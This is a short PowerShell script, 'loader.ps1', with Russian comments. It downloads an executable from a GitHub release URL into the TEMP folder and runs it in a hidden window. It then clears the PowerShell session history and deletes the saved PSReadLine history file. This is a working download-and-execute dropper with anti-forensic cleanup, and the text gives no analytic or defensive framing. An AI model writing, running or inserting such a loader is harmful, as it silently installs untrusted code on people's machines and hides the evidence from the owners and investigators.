# loader.ps1
$url = "https://github.com/kotoedoff/thunder-hub-beta/releases/download/kotoed/testapp.exe"
$path = "$env:TEMP\testapp.exe"

# Качаем
(New-Object Net.WebClient).DownloadFile($url, $path)

# Проверяем и запускаем
if (Test-Path $path) {
    Start-Process -FilePath $path -WindowStyle Hidden
}

# Очищаем историю
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
